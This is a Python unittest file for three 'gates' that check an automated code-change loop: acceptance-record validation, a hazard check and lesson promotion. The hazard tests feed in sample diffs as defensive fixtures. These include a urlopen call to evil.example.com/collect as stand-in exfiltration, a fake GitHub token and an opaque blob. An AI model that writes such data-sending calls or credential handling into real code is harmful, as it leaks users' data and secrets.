"""三道门的测试。

这些测试就是“没有这次改动就会失败”的那种：把 assert 里的行为去掉，
它们会真的红。跑法：python -m unittest discover -s tests -t .
"""

from __future__ import annotations

import json
import sys
import unittest
from pathlib import Path

REPO_ROOT = Path(__file__).resolve().parent.parent
if str(REPO_ROOT) not in sys.path:
    sys.path.insert(0, str(REPO_ROOT))

from gates import acceptance_check as acc
from gates import hazard_check as hz
from gates import lessons_promote as lp

FIXTURES = REPO_ROOT / "tests" / "fixtures"


# --------------------------------------------------------------------------- 验收门


GOOD_TEXT = """fix: dashboard crash on empty list

Acceptance:
Source: x/@devon (v0.1.3336)
Cause: 空列表时取了 items[0]，越界。
Change: 先判空再取，补了一条空列表的测试。
Verified:
  - macos-15 arm64 | full suite | PASS
  - wsl ubuntu, /bin/sh=dash | test_hook | PASS
Red/Green:
  - revert old code: FAIL (IndexError)
  - apply new code: PASS
Not run:
  - 真实 NAS (没有设备)
"""


class AcceptanceTests(unittest.TestCase):
    def test_good_text_passes(self) -> None:
        record = acc.parse_text(GOOD_TEXT)
        problems, _ = acc.validate(record)
        self.assertEqual([], problems)

    def test_missing_not_run_is_rejected(self) -> None:
        text = GOOD_TEXT.split("Not run:")[0]
        problems, _ = acc.validate(acc.parse_text(text))
        self.assertTrue(any("Not run" in p for p in problems), problems)

    def test_red_without_fail_is_rejected(self) -> None:
        text = GOOD_TEXT.replace("  - revert old code: FAIL (IndexError)\n", "")
        problems, _ = acc.validate(acc.parse_text(text))
        self.assertTrue(any("FAIL" in p for p in problems), problems)

    def test_empty_not_run_is_rejected(self) -> None:
        text = GOOD_TEXT.replace("  - 真实 NAS (没有设备)", "")
        problems, _ = acc.validate(acc.parse_text(text))
        self.assertTrue(any("Not run" in p for p in problems), problems)

    def test_none_not_run_passes(self) -> None:
        text = GOOD_TEXT.replace("  - 真实 NAS (没有设备)", "  - none")
        problems, _ = acc.validate(acc.parse_text(text))
        self.assertEqual([], problems)

    def test_generic_excuse_is_rejected(self) -> None:
        text = GOOD_TEXT.replace("Cause: 空列表时取了 items[0]，越界。", "Cause: 修复了一些问题")
        problems, _ = acc.validate(acc.parse_text(text))
        self.assertTrue(any("空话" in p for p in problems), problems)

    def test_verified_missing_where_is_rejected(self) -> None:
        text = GOOD_TEXT.replace("  - macos-15 arm64 | full suite | PASS", "  - | full suite | PASS")
        problems, _ = acc.validate(acc.parse_text(text))
        self.assertTrue(any("在哪跑" in p for p in problems), problems)

    def test_loop_may_not_edit_own_rules(self) -> None:
        text = GOOD_TEXT + "\n"
        record = acc.parse_text(text)
        record["files"] = ["AGENTS.md"]
        problems, _ = acc.validate(record)
        self.assertTrue(any("受保护" in p for p in problems), problems)

    def test_json_fixture_passes(self) -> None:
        data = json.loads((FIXTURES / "acceptance_ok.json").read_text(encoding="utf-8"))
        problems, _ = acc.validate(data)
        self.assertEqual([], problems)

    def test_bad_fixture_fails(self) -> None:
        data = json.loads((FIXTURES / "acceptance_bad.json").read_text(encoding="utf-8"))
        problems, _ = acc.validate(data)
        self.assertTrue(len(problems) >= 3, problems)


# --------------------------------------------------------------------------- 危害门


def diff_for(path: str, *lines: str) -> str:
    body = "\n".join("+" + line for line in lines)
    return f"--- /dev/null\n+++ b/{path}\n@@ -0,0 +1,{len(lines)} @@\n{body}\n"


def findings_for(diff: str, files: list[str] | None = None) -> list[dict[str, str]]:
    rules = hz.load_rules()
    diff_files, changed = hz.parse_diff(diff)
    return hz.check(files or changed, diff_files, rules)


class HazardTests(unittest.TestCase):
    def test_ci_config_is_blocked(self) -> None:
        found = findings_for(diff_for(".github/workflows/ci.yml", "on: push"), [".github/workflows/ci.yml"])
        self.assertTrue(any(f["rule"] == "H1" for f in found), found)

    def test_release_script_is_blocked(self) -> None:
        found = findings_for("", ["scripts/release.sh"])
        self.assertTrue(any(f["kind"] == "ci_release" for f in found), found)

    def test_dependency_file_is_blocked(self) -> None:
        found = findings_for("", ["package.json"])
        self.assertTrue(any(f["kind"] == "dependency_change" for f in found), found)

    def test_new_external_url_is_blocked(self) -> None:
        found = findings_for(diff_for("app/net.py", 'urlopen("https://evil.example.com/collect")'))
        self.assertTrue(any(f["rule"] == "H2" for f in found), found)

    def test_known_host_is_allowed(self) -> None:
        found = findings_for(diff_for("app/net.py", 'urlopen("https://github.com/example/repo")'))
        self.assertFalse(any(f["rule"] == "H2" for f in found), found)

    def test_credential_leak_is_blocked(self) -> None:
        found = findings_for(diff_for("app/auth.py", 'TOKEN = "ghp_' + "a" * 36 + '"'))
        self.assertTrue(any(f["rule"] == "H4" for f in found), found)

    def test_credential_file_is_blocked(self) -> None:
        found = findings_for("", ["config/.env"])
        self.assertTrue(any(f["kind"] == "credential_access" for f in found), found)

    def test_promotion_link_is_blocked(self) -> None:
        found = findings_for(diff_for("docs/index.md", "[best relay](https://relay.example.com/?ref=abc)"))
        self.assertTrue(any(f["rule"] == "H6" for f in found), found)

    def test_promo_word_alone_is_not_blocked(self) -> None:
        """写文档解释这条规则时必然会提到这些词，不能因此把自己拦住。"""
        found = findings_for(diff_for("docs/rules.md", "危害门会拦推广链接、中转站和返利口令。"))
        self.assertFalse(any(f["rule"] == "H6" for f in found), found)

    def test_promo_word_with_link_is_blocked(self) -> None:
        found = findings_for(
            diff_for("docs/sponsors.md", "[加速节点](https://relay.example.com/x) 这是我们的返利入口")
        )
        self.assertTrue(any(f["rule"] == "H6" for f in found), found)

    def test_opaque_blob_is_blocked(self) -> None:
        blob = "A" * 40 + "8f3k2m9q7w1e5r6t0y4u2i3o8p7a6s5d" * 6
        found = findings_for(diff_for("app/payload.py", f'DATA = "{blob}"'))
        self.assertTrue(any(f["kind"] == "opaque_blob" for f in found), found)

    def test_plain_code_passes(self) -> None:
        found = findings_for(diff_for("app/logic.py", "def add(a, b):", "    return a + b"))
        self.assertEqual([], found)

    def test_blocklisted_author_is_blocked(self) -> None:
        rules = hz.load_rules()
        found = hz.check([], [], rules, author="bad-actor", blocklist={"github/bad-actor"})
        self.assertTrue(any(f["rule"] == "BLOCK" for f in found), found)


# --------------------------------------------------------------------------- 错题本


class LessonTests(unittest.TestCase):
    def test_parses_all_lessons(self) -> None:
        _, lessons = lp.load_lessons()
        self.assertGreaterEqual(len(lessons), 5)
        self.assertEqual("L-001", lessons[0].id)

    def test_three_distinct_days_is_ready(self) -> None:
        _, lessons = lp.load_lessons()
        by_id = {lesson.id: lesson for lesson in lessons}
        self.assertTrue(lp.ready(by_id["L-001"]))
        self.assertFalse(lp.ready(by_id["L-005"]))

    def test_machine_checkable_is_read(self) -> None:
        _, lessons = lp.load_lessons()
        by_id = {lesson.id: lesson for lesson in lessons}
        self.assertTrue(by_id["L-002"].machine_checkable)
        self.assertFalse(by_id["L-001"].machine_checkable)

    def test_apply_dry_run_writes_nothing(self) -> None:
        lessons_before = lp.LESSONS.read_text(encoding="utf-8")
        standards_before = lp.STANDARDS.read_text(encoding="utf-8")
        _, lessons = lp.load_lessons()
        lp.cmd_apply(lessons, "2026-11-17", dry_run=True)
        self.assertEqual(lessons_before, lp.LESSONS.read_text(encoding="utf-8"))
        self.assertEqual(standards_before, lp.STANDARDS.read_text(encoding="utf-8"))

    def test_zone_insert_keeps_markers(self) -> None:
        text = "head\n<!-- promoted-zone:start -->\nold\n<!-- promoted-zone:end -->\ntail\n"
        out = lp.insert_into_zone(text, ["new-block\n"])
        self.assertIn("new-block", out)
        self.assertIn("old", out)
        self.assertLess(out.index("promoted-zone:start"), out.index("new-block"))
        self.assertLess(out.index("new-block"), out.index("promoted-zone:end"))


if __name__ == "__main__":
    unittest.main()
